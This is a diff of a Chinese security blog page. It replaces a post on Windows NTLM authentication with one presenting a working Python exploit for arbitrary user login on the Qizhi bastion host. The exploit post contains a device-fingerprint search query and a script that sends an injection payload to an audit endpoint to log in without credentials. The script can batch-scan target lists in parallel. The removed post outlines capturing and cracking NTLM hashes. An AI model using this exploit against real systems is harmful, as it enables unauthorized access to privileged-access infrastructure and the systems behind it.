@@ -14,11 +14,11 @@
     <script async defer src="https://buttons.github.io/buttons.js"></script>
     <title>
         
-          windows本地认证和NTML认证 - Kat | Blog
+          齐治堡垒机任意用户登录 - Kat | Blog
         
     </title>
 
-    <link rel="canonical" href="https://spanning-tree.xyz/2021/0466d81e0e.html">
+    <link rel="canonical" href="https://spanning-tree.xyz/2021/04f8593b1e.html">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -88,14 +88,14 @@
                     <div class="post-heading">
                         <div class="tags">
                             
-                              <a class="tag" href="/tags/#内网渗透" title="内网渗透">内网渗透</a>
+                              <a class="tag" href="/tags/#漏洞利用" title="漏洞利用">漏洞利用</a>
                             
                         </div>
-                        <h1>windows本地认证和NTML认证</h1>
+                        <h1>齐治堡垒机任意用户登录</h1>
                         <h2 class="subheading"></h2>
                         <span class="meta">
                             Posted by Kat on
-                            2021-04-11
+                            2021-04-24
                         </span>
                     </div>
                 
@@ -215,29 +215,12 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                <h1 id="windows本地认证和ntml认证">Windows本地认证和NTML认证</h1>
-<p>在介绍windwos本地认证和NTML认证之前先介绍一下NTML哈希算法。</p>
-<p>NTML哈希算法是微软在windows2000之后推出的新密码管理方式，wiindows机器都是用NTML哈希算法加密用户的密码，密码保存在%SystemRoot%\System32\config\SAM 文件中。</p>
-<p>通常在渗透测试中可从 Windows 系统中的 SAM 文件 和 域控的 NTDS.dit 文件中获得所有用户的 Hash。</p>
-<p>NTLM 适用范围非常广，既可用于域内的认证服务， 也可用于没有域的工作组环境。NTLM 有 <strong>NTLMv1</strong> 、<strong>NTLMv2</strong> 、<strong>NTLMsession v2</strong> 三个版本，目前使用最多的是 NTLMv2 版本。</p>
-<p>在windows认证体系中主要有俩种认证体系，一个是NTML认证体系一个是Kerberos认证体系。</p>
-<h2 id="1-windows本地认证">1. Windows本地认证</h2>
-<p>Windows本地用户在登录的时候会将用户输入的密码是用NTML哈希进行加密，将加密后的哈希与本地SAM文件中的哈希值进行比对，比对成功后即可登录。</p>
-<p>当用户注销、重启、锁屏后，操作系统会让 winlogon 显示登录界面，也就是输入框。当 winlogon.exe 接收输入后，将密码交给 lsass 进程，这个进程中会存一份明文密码，将明文密码加密成 NTLM Hash，对 SAM 数据库比较认证。</p>
-<h2 id="2-ntml认证方式工作组环境">2. NTML认证方式（工作组环境）</h2>
-<p>在非域环境下，一般都是使用 NTLM 进行认证。SMB 服务和很多 Web 程序都是使用 NTLM 来实现对用户的身份认证。</p>
-<p>NTML工作组环境认证流程：</p>
-<p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gpg7sb3scoj31mk0ggamj.jpg" alt="image-20210411220516233"></p>
-<p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gpg7sgn9naj317a0fan4b.jpg" alt="image-20210411223928119"></p>
-<p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gpg7skchnjj31n60imdr6.jpg" alt="image-20210411223832988"></p>
-<p>由于客户端在连接文件服务器时，默认会将当前登录用户的密码Hash发送至服务器进行验证，在这个过程中就给攻击者提供了破解NTML hash的机会。</p>
-<p>如果获得了内网一个文件服务器的权限，那么内网中的其他主机在使用界面尝试访问该服务器时，首先会将本机的密码Hash发送至服务器进行验证，在服务器端抓取数据包能够获得NTLM Response，对NTLM Response的格式进行解析，提取特定信息，使用Hashcat尝试字典破解或者暴力破解，就有可能还原出用户本机的明文口令。</p>
-<p>也就是说我们如果可以抓取数据包，也就有可能获取其他用户的账号密码。</p>
-<p>参考链接：<a href="https://blog.csdn.net/sinolover/article/details/103971084" target="_blank" rel="noopener">https://blog.csdn.net/sinolover/article/details/103971084</a></p>
-<h2 id="3-ntml认证方式域环境中">3. NTML认证方式（域环境中）</h2>
-<p>在域环境中优先使用Kerberos认证方式，当Kerberos认证不可用的时候才会使用NTML认证方式。</p>
-<p>NTML域环境中的认证流程：</p>
-<p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gpg7sq388vj31ma0s8awc.jpg" alt="image-20210411221042111"></p>
+                <h2 id="1-漏洞简介">1. 漏洞简介</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">齐治堡垒机分为两大版本:PHP、JAVA。漏洞最多的处在PHP,Java相对安全</span><br></pre></td></tr></table></figure>
+<h2 id="2-设备指纹">2. 设备指纹</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="齐治科技-堡垒机"</span><br></pre></td></tr></table></figure>
+<h2 id="3-exp">3. EXP</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">title</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[----------------------------------------------------------]"</span>)</span><br><span class="line">    print(<span class="string">"[--------            齐治堡垒机任意用户登录            --------]"</span>)</span><br><span class="line">    print(<span class="string">"[--------            use: python3 qizhi.py         --------]"</span>)</span><br><span class="line">    print(<span class="string">"[--------              Author: Kat                 --------]"</span>)</span><br><span class="line">    print(<span class="string">"[----------------------------------------------------------]"</span>)</span><br><span class="line">    print(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multithreading</span><span class="params">(funcname, filename=<span class="string">"url.txt"</span>, pools=<span class="number">5</span>)</span>:</span></span><br><span class="line">    works = []</span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">            func_params = [i.rstrip(<span class="string">"\n"</span>)]</span><br><span class="line">            works.append((func_params, <span class="keyword">None</span>))</span><br><span class="line">    pool = threadpool.ThreadPool(pools)</span><br><span class="line">    reqs = threadpool.makeRequests(funcname, works)</span><br><span class="line">    [pool.putRequest(req) <span class="keyword">for</span> req <span class="keyword">in</span> reqs]</span><br><span class="line">    pool.wait()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(url)</span>:</span></span><br><span class="line">    tar_url = url + <span class="string">'/audit/gui_detail_view.php'</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0"</span>,</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded;charset=UTF-8"</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">'token'</span>: <span class="string">'1'</span>,</span><br><span class="line">        <span class="string">'id'</span>: <span class="string">'%5C'</span>,</span><br><span class="line">        <span class="string">'uid'</span>: <span class="string">'%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23'</span>,</span><br><span class="line">        <span class="string">'login'</span>: <span class="string">'shterm'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(url=tar_url, params=payload, headers=headers, verify=<span class="keyword">False</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        outprint = res.text.replace(<span class="string">'&lt;br&gt;'</span>, <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"审计管理员"</span> <span class="keyword">in</span> outprint <span class="keyword">and</span> <span class="string">"事件审计"</span> <span class="keyword">in</span> outprint <span class="keyword">and</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">f"\033[31m[!]  目标系统: <span class="subst">&#123;url&#125;</span> 存在任意用户登录漏洞！"</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">'result:auth failure'</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(<span class="string">f"\033[31m[!]  目标系统: <span class="subst">&#123;url&#125;</span> 不存在任意用户登录漏洞！"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">f"[0]  目标系统: <span class="subst">&#123;url&#125;</span> 出现异常！"</span>)</span><br><span class="line">        <span class="comment"># print(e)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> (len(sys.argv)) &lt; <span class="number">2</span>:</span><br><span class="line">        print(<span class="string">'useage : python'</span> + str(sys.argv[<span class="number">0</span>]) + <span class="string">' -h'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        parser = argparse.ArgumentParser()</span><br><span class="line">        parser.add_argument(<span class="string">'-u'</span>, help=<span class="string">"url -&gt; example http://127.0.0.1"</span>, type=str, dest=<span class="string">'check_url'</span>)</span><br><span class="line">        parser.add_argument(<span class="string">'-r'</span>, help=<span class="string">"url list to file"</span>, type=str, dest=<span class="string">'check_file'</span>)</span><br><span class="line">        args = parser.parse_args()</span><br><span class="line">        <span class="keyword">if</span> args.check_url:</span><br><span class="line">            check(args.check_url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (args.check_file):</span><br><span class="line">            multithreading(check, args.check_file, <span class="number">8</span>)</span><br></pre></td></tr></table></figure>
 
                 
 
@@ -245,13 +228,9 @@
                 <!-- Pager -->
                 <ul class="pager">
                     
-                        <li class="previous">
-                            <a href="/2021/04f8593b1e.html" data-toggle="tooltip" data-placement="top" title="齐治堡垒机任意用户登录">&larr; Previous Post</a>
-                        </li>
-                    
                     
                         <li class="next">
-                            <a href="/2021/043e4e3078.html" data-toggle="tooltip" data-placement="top" title="LDAP协议">Next Post &rarr;</a>
+                            <a href="/2021/0466d81e0e.html" data-toggle="tooltip" data-placement="top" title="windows本地认证和NTML认证">Next Post &rarr;</a>
                         </li>
                     
                 </ul>
@@ -307,7 +286,7 @@
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#windows本地认证和ntml认证"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Windows&#x672C;&#x5730;&#x8BA4;&#x8BC1;&#x548C;NTML&#x8BA4;&#x8BC1;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#1-windows本地认证"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">1. Windows&#x672C;&#x5730;&#x8BA4;&#x8BC1;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#2-ntml认证方式工作组环境"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">2. NTML&#x8BA4;&#x8BC1;&#x65B9;&#x5F0F;&#xFF08;&#x5DE5;&#x4F5C;&#x7EC4;&#x73AF;&#x5883;&#xFF09;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#3-ntml认证方式域环境中"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">3. NTML&#x8BA4;&#x8BC1;&#x65B9;&#x5F0F;&#xFF08;&#x57DF;&#x73AF;&#x5883;&#x4E2D;&#xFF09;</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#1-漏洞简介"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">1. &#x6F0F;&#x6D1E;&#x7B80;&#x4ECB;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#2-设备指纹"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">2. &#x8BBE;&#x5907;&#x6307;&#x7EB9;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#3-exp"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">3. EXP</span></a></li></ol>
         
         </div>
       </aside>
@@ -327,7 +306,7 @@
                     <h5><a href="/tags/">FEATURED TAGS</a></h5>
                     <div class="tags">
                        
-                          <a class="tag" href="/tags/#内网渗透" title="内网渗透">内网渗透</a>
+                          <a class="tag" href="/tags/#漏洞利用" title="漏洞利用">漏洞利用</a>
                         
                     </div>
                 </section>
